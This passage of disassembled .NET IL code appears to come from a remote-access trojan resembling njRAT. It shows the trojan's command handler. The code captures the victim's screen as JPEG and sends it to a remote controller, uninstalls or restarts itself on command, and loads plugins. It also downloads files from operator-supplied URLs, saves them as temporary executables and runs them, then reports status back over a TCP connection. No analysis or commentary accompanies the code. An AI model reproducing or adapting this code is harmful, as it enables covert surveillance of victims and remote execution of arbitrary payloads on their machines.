      IL_0887:  ldloca.s   V_70
      IL_0889:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_088e:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_0893:  stloc.s    V_21
      IL_0895:  ldloc.s    V_21
      IL_0897:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_089c:  stloc.s    V_17
      IL_089e:  ldloc.s    V_17
      IL_08a0:  ldc.i4.0
      IL_08a1:  ldc.i4.0
      IL_08a2:  ldc.i4.0
      IL_08a3:  ldc.i4.0
      IL_08a4:  ldloca.s   V_71
      IL_08a6:  ldloc.s    V_21
      IL_08a8:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_08ad:  ldloc.s    V_21
      IL_08af:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_08b4:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_08b9:  ldloc.s    V_71
      IL_08bb:  ldc.i4     0xcc0020
      IL_08c0:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_08c5:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_08ca:  ldloc.s    V_17
        IL_08cc:  ldloca.s   V_70
        IL_08ce:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_08d3:  ldloca.s   V_71
        IL_08d5:  ldc.i4.s   32
        IL_08d7:  ldc.i4.s   32
        IL_08d9:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_08de:  ldloc.s    V_71
        IL_08e0:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_08e5:  ldloc.s    V_70
        IL_08e7:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_08ec:  leave.s    IL_08fa

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_08ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_08f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_08f8:  leave.s    IL_08fa

      }  // end handler
      IL_08fa:  ldloc.s    V_17
      IL_08fc:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0901:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0906:  stloc.s    V_19
      IL_0908:  ldarg.0
      IL_0909:  ldstr      "CAP"
      IL_090e:  ldarg.0
      IL_090f:  ldfld      string k.OK::Y
      IL_0914:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0919:  stloc.s    V_56
      IL_091b:  ldloca.s   V_56
      IL_091d:  callvirt   instance uint8[] k.OK::SB(string&)
      IL_0922:  starg.s    b
      IL_0924:  ldloc.s    V_19
      IL_0926:  ldarg.1
      IL_0927:  ldc.i4.0
      IL_0928:  ldarg.1
      IL_0929:  ldlen
      IL_092a:  conv.ovf.i4
      IL_092b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0930:  ldc.i4.1
      IL_0931:  newobj     instance void [System.Drawing]System.Drawing.Imaging.EncoderParameters::.ctor(int32)
      IL_0936:  stloc.s    V_16
      IL_0938:  ldloc.s    V_16
      IL_093a:  callvirt   instance class [System.Drawing]System.Drawing.Imaging.EncoderParameter[] [System.Drawing]System.Drawing.Imaging.EncoderParameters::get_Param()
      IL_093f:  ldc.i4.0
      IL_0940:  ldsfld     class [System.Drawing]System.Drawing.Imaging.Encoder [System.Drawing]System.Drawing.Imaging.Encoder::Quality
      IL_0945:  ldc.i4.s   50
      IL_0947:  conv.i8
      IL_0948:  newobj     instance void [System.Drawing]System.Drawing.Imaging.EncoderParameter::.ctor(class [System.Drawing]System.Drawing.Imaging.Encoder,
                                                                                                        int64)
      IL_094d:  stelem.ref
      IL_094e:  ldarg.0
      IL_094f:  ldstr      "image/jpeg"
      IL_0954:  callvirt   instance class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo k.OK::GetEncoderInfo(string)
      IL_0959:  stloc.s    V_18
      IL_095b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0960:  stloc.s    V_20
      IL_0962:  ldloc.s    V_21
      IL_0964:  ldloc.0
      IL_0965:  ldc.i4.1
      IL_0966:  ldelem.ref
      IL_0967:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_096c:  ldloc.0
      IL_096d:  ldc.i4.2
      IL_096e:  ldelem.ref
      IL_096f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0974:  ldnull
      IL_0975:  ldloc.s    V_72
      IL_0977:  callvirt   instance class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::GetThumbnailImage(int32,
                                                                                                                                       int32,
                                                                                                                                       class [System.Drawing]System.Drawing.Image/GetThumbnailImageAbort,
                                                                                                                                       native int)
      IL_097c:  ldloc.s    V_20
      IL_097e:  ldloc.s    V_18
      IL_0980:  ldloc.s    V_16
      IL_0982:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo,
                                                                                    class [System.Drawing]System.Drawing.Imaging.EncoderParameters)
      IL_0987:  ldloc.s    V_19
      IL_0989:  ldloc.s    V_20
      IL_098b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0990:  ldc.i4.0
      IL_0991:  ldloc.s    V_20
      IL_0993:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0998:  conv.ovf.i4
      IL_0999:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_099e:  ldarg.0
      IL_099f:  ldloc.s    V_19
      IL_09a1:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_09a6:  callvirt   instance bool k.OK::Sendb(uint8[])
      IL_09ab:  pop
      IL_09ac:  ldloc.s    V_19
      IL_09ae:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_09b3:  ldloc.s    V_20
      IL_09b5:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_09ba:  ldloc.s    V_21
      IL_09bc:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_09c1:  leave      IL_1242

      IL_09c6:  ldloc.s    V_55
      IL_09c8:  ldstr      "un"
      IL_09cd:  ldc.i4.0
      IL_09ce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09d3:  ldc.i4.0
      IL_09d4:  bne.un     IL_0a6d

      IL_09d9:  ldloc.0
      IL_09da:  ldc.i4.1
      IL_09db:  ldelem.ref
      IL_09dc:  stloc.s    V_73
      IL_09de:  ldloc.s    V_73
      IL_09e0:  ldstr      "~"
      IL_09e5:  ldc.i4.0
      IL_09e6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09eb:  ldc.i4.0
      IL_09ec:  bne.un.s   IL_09f9

      IL_09ee:  ldarg.0
      IL_09ef:  callvirt   instance void k.OK::UNS()
      IL_09f4:  leave      IL_1242

      IL_09f9:  ldloc.s    V_73
      IL_09fb:  ldstr      "!"
      IL_0a00:  ldc.i4.0
      IL_0a01:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a06:  ldc.i4.0
      IL_0a07:  bne.un.s   IL_0a29

      IL_0a09:  ldarg.0
      IL_0a0a:  ldc.i4.0
      IL_0a0b:  callvirt   instance void k.OK::pr(int32)
      IL_0a10:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0a15:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_0a1a:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0a1f:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0a24:  leave      IL_1242

      IL_0a29:  ldloc.s    V_73
      IL_0a2b:  ldstr      "@"
      IL_0a30:  ldc.i4.0
      IL_0a31:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a36:  ldc.i4.0
      IL_0a37:  bne.un     IL_11a5

      IL_0a3c:  ldarg.0
      IL_0a3d:  ldc.i4.0
      IL_0a3e:  callvirt   instance void k.OK::pr(int32)
      IL_0a43:  ldarg.0
      IL_0a44:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_0a49:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0a4e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0a53:  pop
      IL_0a54:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0a59:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_0a5e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0a63:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0a68:  leave      IL_1242

      IL_0a6d:  ldloc.s    V_55
      IL_0a6f:  ldstr      "Ex"
      IL_0a74:  ldc.i4.0
      IL_0a75:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a7a:  ldc.i4.0
      IL_0a7b:  bne.un     IL_0b49

      IL_0a80:  ldarg.0
      IL_0a81:  ldfld      object k.OK::PLG
      IL_0a86:  brtrue.s   IL_0ae5

      IL_0a88:  ldarg.0
      IL_0a89:  ldstr      "PLG"
      IL_0a8e:  callvirt   instance bool k.OK::Send(string)
      IL_0a93:  pop
      IL_0a94:  ldc.i4.0
      IL_0a95:  stloc.s    V_22
      IL_0a97:  br.s       IL_0aa9

      IL_0a99:  ldloc.s    V_22
      IL_0a9b:  ldc.i4.1
      IL_0a9c:  add.ovf
      IL_0a9d:  stloc.s    V_22
      IL_0a9f:  ldc.i4     0x3e8
      IL_0aa4:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0aa9:  ldarg.0
      IL_0aaa:  ldfld      object k.OK::PLG
      IL_0aaf:  ldnull
      IL_0ab0:  ceq
      IL_0ab2:  ldc.i4.0
      IL_0ab3:  ceq
      IL_0ab5:  ldc.i4.0
      IL_0ab6:  ceq
      IL_0ab8:  ldloc.s    V_22
      IL_0aba:  ldc.i4.s   20
      IL_0abc:  ceq
      IL_0abe:  or
      IL_0abf:  ldarg.0
      IL_0ac0:  ldfld      bool k.OK::Cn
      IL_0ac5:  ldc.i4.0
      IL_0ac6:  ceq
      IL_0ac8:  or
      IL_0ac9:  brtrue.s   IL_0a99

      IL_0acb:  ldarg.0
      IL_0acc:  ldfld      object k.OK::PLG
      IL_0ad1:  ldnull
      IL_0ad2:  ceq
      IL_0ad4:  ldarg.0
      IL_0ad5:  ldfld      bool k.OK::Cn
      IL_0ada:  ldc.i4.0
      IL_0adb:  ceq
      IL_0add:  or
      IL_0ade:  brfalse.s  IL_0ae5

      IL_0ae0:  leave      IL_1242

      IL_0ae5:  ldarg.0
      IL_0ae6:  ldfld      object k.OK::PLG
      IL_0aeb:  ldnull
      IL_0aec:  ldstr      "ind"
      IL_0af1:  ldc.i4.1
      IL_0af2:  newarr     [mscorlib]System.Object
      IL_0af7:  stloc.s    V_61
      IL_0af9:  ldloc.s    V_61
      IL_0afb:  ldc.i4.0
      IL_0afc:  ldarg.1
      IL_0afd:  stelem.ref
      IL_0afe:  ldloc.s    V_61
      IL_0b00:  stloc.s    V_74
      IL_0b02:  ldloc.s    V_74
      IL_0b04:  ldnull
      IL_0b05:  ldnull
      IL_0b06:  ldc.i4.1
      IL_0b07:  newarr     [mscorlib]System.Boolean
      IL_0b0c:  stloc.s    V_75
      IL_0b0e:  ldloc.s    V_75
      IL_0b10:  ldc.i4.0
      IL_0b11:  ldc.i4.1
      IL_0b12:  stelem.i1
      IL_0b13:  ldloc.s    V_75
      IL_0b15:  ldc.i4.1
      IL_0b16:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0b1b:  pop
      IL_0b1c:  ldloc.s    V_75
      IL_0b1e:  ldc.i4.0
      IL_0b1f:  ldelem.i1
      IL_0b20:  brfalse    IL_11a5

      IL_0b25:  ldloc.s    V_74
      IL_0b27:  ldc.i4.0
      IL_0b28:  ldelem.ref
      IL_0b29:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0b2e:  ldtoken    uint8[]
      IL_0b33:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0b38:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0b3d:  castclass  uint8[]
      IL_0b42:  starg.s    b
      IL_0b44:  leave      IL_1242

      IL_0b49:  ldloc.s    V_55
      IL_0b4b:  ldstr      "PLG"
      IL_0b50:  ldc.i4.0
      IL_0b51:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b56:  ldc.i4.0
      IL_0b57:  bne.un     IL_0c25

      IL_0b5c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0b61:  stloc.s    V_23
      IL_0b63:  ldloc.0
      IL_0b64:  ldc.i4.0
      IL_0b65:  ldelem.ref
      IL_0b66:  ldarg.0
      IL_0b67:  ldfld      string k.OK::Y
      IL_0b6c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0b71:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0b76:  stloc.s    V_24
      IL_0b78:  ldloc.s    V_23
      IL_0b7a:  ldarg.1
      IL_0b7b:  ldloc.s    V_24
      IL_0b7d:  ldarg.1
      IL_0b7e:  ldlen
      IL_0b7f:  conv.ovf.i4
      IL_0b80:  ldloc.s    V_24
      IL_0b82:  sub.ovf
      IL_0b83:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0b88:  ldarg.0
      IL_0b89:  ldarg.0
      IL_0b8a:  ldarg.0
      IL_0b8b:  ldloc.s    V_23
      IL_0b8d:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0b92:  callvirt   instance uint8[] k.OK::ZIP(uint8[])
      IL_0b97:  ldstr      "A"
      IL_0b9c:  callvirt   instance object k.OK::Plugin(uint8[],
                                                        string)
      IL_0ba1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ba6:  stfld      object k.OK::PLG
      IL_0bab:  ldarg.0
      IL_0bac:  ldfld      object k.OK::PLG
      IL_0bb1:  ldnull
      IL_0bb2:  ldstr      "H"
      IL_0bb7:  ldc.i4.1
      IL_0bb8:  newarr     [mscorlib]System.Object
      IL_0bbd:  stloc.s    V_74
      IL_0bbf:  ldloc.s    V_74
      IL_0bc1:  ldc.i4.0
      IL_0bc2:  ldarg.0
      IL_0bc3:  ldfld      string k.OK::H
      IL_0bc8:  stelem.ref
      IL_0bc9:  ldloc.s    V_74
      IL_0bcb:  ldnull
      IL_0bcc:  ldnull
      IL_0bcd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0bd2:  ldarg.0
      IL_0bd3:  ldfld      object k.OK::PLG
      IL_0bd8:  ldnull
      IL_0bd9:  ldstr      "P"
      IL_0bde:  ldc.i4.1
      IL_0bdf:  newarr     [mscorlib]System.Object
      IL_0be4:  stloc.s    V_74
      IL_0be6:  ldloc.s    V_74
      IL_0be8:  ldc.i4.0
      IL_0be9:  ldarg.0
      IL_0bea:  ldfld      string k.OK::P
      IL_0bef:  stelem.ref
      IL_0bf0:  ldloc.s    V_74
      IL_0bf2:  ldnull
      IL_0bf3:  ldnull
      IL_0bf4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0bf9:  ldarg.0
      IL_0bfa:  ldfld      object k.OK::PLG
      IL_0bff:  ldnull
      IL_0c00:  ldstr      "c"
      IL_0c05:  ldc.i4.1
      IL_0c06:  newarr     [mscorlib]System.Object
      IL_0c0b:  stloc.s    V_74
      IL_0c0d:  ldloc.s    V_74
      IL_0c0f:  ldc.i4.0
      IL_0c10:  ldarg.0
      IL_0c11:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
      IL_0c16:  stelem.ref
      IL_0c17:  ldloc.s    V_74
      IL_0c19:  ldnull
      IL_0c1a:  ldnull
      IL_0c1b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0c20:  leave      IL_1242

      IL_0c25:  ldloc.s    V_55
      IL_0c27:  ldstr      "up"
      IL_0c2c:  ldc.i4.0
      IL_0c2d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c32:  ldc.i4.0
      IL_0c33:  bne.un     IL_0daf

      IL_0c38:  ldloc.0
      IL_0c39:  ldc.i4.1
      IL_0c3a:  ldelem.ref
      IL_0c3b:  ldc.i4.0
      IL_0c3c:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0c41:  ldc.i4.s   31
      IL_0c43:  bne.un.s   IL_0cbb

      .try
      {
        IL_0c45:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0c4a:  stloc.s    V_27
        IL_0c4c:  ldloc.0
        IL_0c4d:  ldc.i4.0
        IL_0c4e:  ldelem.ref
        IL_0c4f:  ldarg.0
        IL_0c50:  ldfld      string k.OK::Y
        IL_0c55:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0c5a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0c5f:  stloc.s    V_26
        IL_0c61:  ldloc.s    V_27
        IL_0c63:  ldarg.1
        IL_0c64:  ldloc.s    V_26
        IL_0c66:  ldarg.1
        IL_0c67:  ldlen
        IL_0c68:  conv.ovf.i4
        IL_0c69:  ldloc.s    V_26
        IL_0c6b:  sub.ovf
        IL_0c6c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0c71:  ldarg.0
        IL_0c72:  ldloc.s    V_27
        IL_0c74:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0c79:  callvirt   instance uint8[] k.OK::ZIP(uint8[])
        IL_0c7e:  stloc.1
        IL_0c7f:  leave      IL_0d09

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0c84:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0c89:  ldarg.0
        IL_0c8a:  ldstr      "MSG"
        IL_0c8f:  ldarg.0
        IL_0c90:  ldfld      string k.OK::Y
        IL_0c95:  ldstr      "Update ERROR"
        IL_0c9a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0c9f:  callvirt   instance bool k.OK::Send(string)
        IL_0ca4:  pop
        IL_0ca5:  ldarg.0
        IL_0ca6:  ldstr      "bla"
        IL_0cab:  callvirt   instance bool k.OK::Send(string)
        IL_0cb0:  pop
        IL_0cb1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0cb6:  leave      IL_1242

      }  // end handler
      IL_0cbb:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0cc0:  stloc.s    V_28
      .try
      {
        IL_0cc2:  ldloc.s    V_28
        IL_0cc4:  ldloc.0
        IL_0cc5:  ldc.i4.1
        IL_0cc6:  ldelem.ref
        IL_0cc7:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0ccc:  stloc.1
        IL_0ccd:  leave.s    IL_0d09

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0ccf:  dup
        IL_0cd0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0cd5:  stloc.s    V_29
        IL_0cd7:  ldarg.0
        IL_0cd8:  ldstr      "MSG"
        IL_0cdd:  ldarg.0
        IL_0cde:  ldfld      string k.OK::Y
        IL_0ce3:  ldstr      "Update ERROR"
        IL_0ce8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0ced:  callvirt   instance bool k.OK::Send(string)
        IL_0cf2:  pop
        IL_0cf3:  ldarg.0
        IL_0cf4:  ldstr      "bla"
        IL_0cf9:  callvirt   instance bool k.OK::Send(string)
        IL_0cfe:  pop
        IL_0cff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d04:  leave      IL_1242

      }  // end handler
      IL_0d09:  ldarg.0
      IL_0d0a:  ldstr      "bla"
      IL_0d0f:  callvirt   instance bool k.OK::Send(string)
      IL_0d14:  pop
      IL_0d15:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_0d1a:  ldstr      ".exe"
      IL_0d1f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0d24:  stloc.s    V_25
      .try
      {
        IL_0d26:  ldarg.0
        IL_0d27:  ldstr      "MSG"
        IL_0d2c:  ldarg.0
        IL_0d2d:  ldfld      string k.OK::Y
        IL_0d32:  ldstr      "Updating To "
        IL_0d37:  ldloc.s    V_25
        IL_0d39:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0d3e:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0d43:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0d48:  callvirt   instance bool k.OK::Send(string)
        IL_0d4d:  pop
        IL_0d4e:  ldc.i4     0x7d0
        IL_0d53:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_0d58:  ldloc.s    V_25
        IL_0d5a:  ldloc.1
        IL_0d5b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0d60:  ldloc.s    V_25
        IL_0d62:  ldstr      ".."
        IL_0d67:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_0d6c:  pop
        IL_0d6d:  leave.s    IL_0da4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0d6f:  dup
        IL_0d70:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0d75:  stloc.s    V_30
        IL_0d77:  ldarg.0
        IL_0d78:  ldstr      "MSG"
        IL_0d7d:  ldarg.0
        IL_0d7e:  ldfld      string k.OK::Y
        IL_0d83:  ldstr      "Update ERROR "
        IL_0d88:  ldloc.s    V_30
        IL_0d8a:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0d8f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0d94:  callvirt   instance bool k.OK::Send(string)
        IL_0d99:  pop
        IL_0d9a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d9f:  leave      IL_1242

      }  // end handler
      IL_0da4:  ldarg.0
      IL_0da5:  callvirt   instance void k.OK::UNS()
      IL_0daa:  leave      IL_1242

      IL_0daf:  ldloc.s    V_55
      IL_0db1:  ldstr      "rn"
      IL_0db6:  ldc.i4.0
      IL_0db7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0dbc:  ldc.i4.0
      IL_0dbd:  bne.un     IL_0f34

      IL_0dc2:  ldloc.0
      IL_0dc3:  ldc.i4.2
      IL_0dc4:  ldelem.ref
      IL_0dc5:  ldc.i4.0
      IL_0dc6:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0dcb:  ldc.i4.s   31
      IL_0dcd:  bne.un     IL_0e54

      .try
      {
        IL_0dd2:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0dd7:  stloc.s    V_33
        IL_0dd9:  ldloc.0
        IL_0dda:  ldc.i4.0
        IL_0ddb:  ldelem.ref
        IL_0ddc:  ldarg.0
        IL_0ddd:  ldfld      string k.OK::Y
        IL_0de2:  ldloc.0
        IL_0de3:  ldc.i4.1
        IL_0de4:  ldelem.ref
        IL_0de5:  ldarg.0
        IL_0de6:  ldfld      string k.OK::Y
        IL_0deb:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0df0:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0df5:  stloc.s    V_32
        IL_0df7:  ldloc.s    V_33
        IL_0df9:  ldarg.1
        IL_0dfa:  ldloc.s    V_32
        IL_0dfc:  ldarg.1
        IL_0dfd:  ldlen
        IL_0dfe:  conv.ovf.i4
        IL_0dff:  ldloc.s    V_32
        IL_0e01:  sub.ovf
        IL_0e02:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0e07:  ldarg.0
        IL_0e08:  ldloc.s    V_33
        IL_0e0a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0e0f:  callvirt   instance uint8[] k.OK::ZIP(uint8[])
        IL_0e14:  stloc.1
        IL_0e15:  leave      IL_0ea2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0e1a:  dup
        IL_0e1b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e20:  stloc.s    V_34
        IL_0e22:  ldarg.0
        IL_0e23:  ldstr      "MSG"
        IL_0e28:  ldarg.0
        IL_0e29:  ldfld      string k.OK::Y
        IL_0e2e:  ldstr      "Execute ERROR"
        IL_0e33:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0e38:  callvirt   instance bool k.OK::Send(string)
        IL_0e3d:  pop
        IL_0e3e:  ldarg.0
        IL_0e3f:  ldstr      "bla"
        IL_0e44:  callvirt   instance bool k.OK::Send(string)
        IL_0e49:  pop
        IL_0e4a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0e4f:  leave      IL_1242

      }  // end handler
      IL_0e54:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0e59:  stloc.s    V_35
      .try
      {
        IL_0e5b:  ldloc.s    V_35
        IL_0e5d:  ldloc.0
        IL_0e5e:  ldc.i4.2
        IL_0e5f:  ldelem.ref
        IL_0e60:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0e65:  stloc.1
        IL_0e66:  leave.s    IL_0ea2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0e68:  dup
        IL_0e69:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e6e:  stloc.s    V_36
        IL_0e70:  ldarg.0
        IL_0e71:  ldstr      "MSG"
        IL_0e76:  ldarg.0
        IL_0e77:  ldfld      string k.OK::Y
        IL_0e7c:  ldstr      "Download ERROR"
